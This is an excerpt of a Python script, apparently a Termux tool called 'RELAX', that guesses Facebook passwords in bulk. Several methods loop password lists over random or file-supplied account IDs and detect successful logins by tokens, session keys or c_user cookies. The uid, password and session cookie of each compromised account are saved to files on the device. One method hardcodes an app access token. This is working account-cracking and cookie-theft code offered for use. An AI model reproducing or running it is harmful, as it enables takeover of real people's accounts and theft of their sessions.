...
try:
    ...
    os.system("clear")
    print(f"{style} {green}RELAX TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python RELAX-GREEN.py")
try:os.makedirs('/sdcard/RELAX-TOOL')
except:pass
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def tarek(z):
...
def key():
    ...
    return uID.upper()
mr_key = key()
try:open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/MR-RELAX.txt', 'w').write(mr_key)
except:pass
#▬▭▬▭▬▭▬▭[ FILE_M1_UA]▬▭▬▭▬▭▬▭#
...
░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒▒ ░ ░▓ ░
  ...
  ░░   ░    ░     ░ ░    ░   ▒    ░    ░  
   ░        ░  ░    ░  ░     ░  ░ ░    ░    [BABY]  """))
info=(f"""{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎MASUM
...
def _method_one(ids,passlist,tl):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-R1{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    ua=(RM1)
    try:
        for pas in passlist:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f"\r\r{red}[{green1}RELAX{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/RELAX-TOOL/RELAX-RANDM-M1-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-RANDM-M1-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                #print(f'\r\r{rad}[RELAX•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/RELAX-TOOL/RELAX-RANDM-M1-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
...
def _method_two(ids,passlist,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{rad}[{green}RELAX-R2{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{green1}RELAX{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/RELAX-TOOL/RELAX-RANDM-M2-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-RANDM-M2-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                #print(f'\r\r{rad}[RELAX•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/RELAX-TOOL/RELAX-RANDM-M2-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
...
def _method_four(ids,passlist,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{rad}[{green}RELAX-R3{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
        ...
        for pas in passlist:
            ...
            if "c_user" in log_cookies:
                ...
                if 'Photoshop' in res:
                    ...
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    oks.append(ids)
                    open('/sdcard/RELAX-TOOL/RELAX-RANDM-M3-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-RANDM-M4-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
            if 'checkpoint' in log_cookies:
                #print(f'\r\r{rad}[RELAX•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/RELAX-TOOL/RELAX-RANDM-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
...
def FILE_M_ONE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-F1{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{red}[{green1}RELAX{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-FILE-M1-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
...
def FILE_M_TWO(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-F2{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-FILE-M2-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
...
def FILE_M_THREE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-F3{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-FILE-M3-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
...
def FILE_M_FOUR(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-F4{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-FILE-M4-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M4-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
...
def FILE_M_FIVE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}RELAX-F5{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RELAX-TOOL/RELAX-FILE-M5-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/RELAX-TOOL/RELAX-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
